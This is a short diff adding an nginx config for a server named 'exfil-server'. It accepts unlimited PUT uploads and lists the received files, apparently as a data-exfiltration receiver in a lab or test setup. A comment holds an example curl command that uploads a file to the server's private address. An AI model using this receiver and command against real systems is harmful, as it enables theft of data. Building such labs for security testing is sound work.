@@ -208,3 +208,25 @@ COPY exfil.conf /etc/nginx/conf.d/default.conf
 
 
 exfil-server/exfil.conf
+
+server {
+    listen 80 default_server;
+    server_name _;
+
+    client_max_body_size 0;      # アップロードサイズ無制限
+
+    # ---- PUT でファイル受信: curl -T file http://172.40.0.10/upload/ ----
+    location /upload/ {
+        root /data;                              # /data/upload/<name> に保存
+        dav_methods PUT DELETE MKCOL COPY MOVE;  # 標準 http_dav_module(nginx同梱)
+        dav_access user:rw group:rw all:r;
+        create_full_put_path on;                 # 中間ディレクトリも自動作成
+        autoindex on;                            # GET で受信済み一覧
+    }
+
+    # ---- 受信ファイルの確認用(GET 一覧/ダウンロード) ----
+    location / {
+        root /data;
+        autoindex on;
+    }
+}
